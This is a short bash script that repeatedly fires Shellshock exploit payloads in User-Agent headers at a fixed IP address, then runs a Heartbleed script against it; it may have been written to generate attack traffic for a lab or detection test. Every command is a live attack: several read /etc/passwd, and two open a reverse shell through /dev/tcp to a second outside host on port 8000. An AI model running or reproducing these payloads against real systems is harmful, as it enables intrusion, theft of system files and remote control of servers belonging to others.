#!/bin/bash


for i in {1..20}
do
curl -H "User-Agent: () { :; }; /bin/eject" -k https://54.191.135.35/badrequest


curl -H "User-Agent: () {:;}; /bin/cat /etc/passwd" -k https://54.191.135.35/badrequest

curl -H "User-Agent: () {:;}; /bin/cat /etc/passwd" -k https://54.191.135.35/badrequest


curl -H "User-Agent: () {:;}; /bin/cat /etc/passwd" -k https://54.191.135.35/badrequest

curl -k -A "() { :;}; echo vulnerable" https://54.191.135.35/cgi-bin/ss2   

curl -k -A "() { :;}; /bin/cat /etc/passwd" https://54.191.135.35/cgi-bin/ss2   
curl -k -A "() { :; };/bin/bash -i >& /dev/tcp/54.187.253.6/8000 0>&1" https://54.191.135.35/cgi-bin/ss2 
curl -k -A "() { :; }; /bin/bash -i >& /dev/tcp/54.187.253.6/8000 0>&1" https://54.191.135.35/cgi-bin/ss
sleep 10
python heartbleed.py 54.191.135.35

sleep 10
done

